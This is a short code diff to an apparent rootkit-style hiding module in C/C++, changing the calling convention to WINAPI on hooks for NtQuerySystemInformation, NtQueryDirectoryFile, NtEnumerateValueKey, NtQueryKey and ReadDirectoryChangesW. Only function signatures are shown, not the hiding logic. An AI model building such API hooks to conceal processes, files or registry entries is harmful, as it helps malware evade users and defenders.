@@ -5,7 +5,7 @@
 #include "Hiding.h"
 
 // -------------------------------- NtQuerySystemInformation -----------------------------------
-NTSTATUS __stdcall H_NtQuerySystemInformationHook(void *data_param, 
+NTSTATUS WINAPI H_NtQuerySystemInformationHook(void *data_param,
 												 SYSTEM_INFORMATION_CLASS SystemInformationClass, 
 												 PVOID SystemInformation, 
 												 LONG SystemInformationLength,
@@ -73,7 +73,7 @@ BOOL H_NtQuerySystemInformation_setup(H_NtQuerySystemInformationStruct *data)
 }
 
 // -------------------------------- NtQueryDirectoryFile -----------------------------------
-NTSTATUS __stdcall H_NtQueryDirectoryFileHook(void *data_param,
+NTSTATUS WINAPI H_NtQueryDirectoryFileHook(void *data_param,
 											  HANDLE FileHandle,
 											  HANDLE Event,
 											  PVOID ApcRoutinte,
@@ -198,7 +198,7 @@ BOOL H_NtQueryDirectoryFile_setup(H_NtQueryDirectoryFileStruct *data)
 
 
 // -------------------------------- NtEnumerateValueKey -----------------------------------
-NTSTATUS __stdcall H_NtEnumerateValueKeyHook(void *data_param,
+NTSTATUS WINAPI H_NtEnumerateValueKeyHook(void *data_param,
 											 HANDLE KeyHandle,
 											 ULONG Index,
 											 LONG KeyValueInformationClass,
@@ -268,7 +268,7 @@ BOOL H_NtEnumerateValueKey_setup(H_NtEnumerateValueKeyStruct *data)
 
 
 // -------------------------------- NtQueryKey -----------------------------------
-NTSTATUS __stdcall H_NtQueryKeyHook(void *data_param,
+NTSTATUS WINAPI H_NtQueryKeyHook(void *data_param,
 									HANDLE KeyHandle, 
 									LONG KeyInformationClass, 
 									PVOID KeyInformation, 
@@ -335,7 +335,7 @@ BOOL H_NtQueryKey_setup(H_NtQueryKeyStruct *data)
 
 // -------------------------------- ReadDirectoryChanges 
 DEFAULT_SETUP_FUNC(H_ReadDirectoryChangesW)
-BOOL __stdcall H_ReadDirectoryChangesWHook(void *data_param,
+BOOL WINAPI H_ReadDirectoryChangesWHook(void *data_param,
 										   HANDLE hDirectory,
 										   LPVOID lpBuffer,
 										   DWORD nBufferLength,
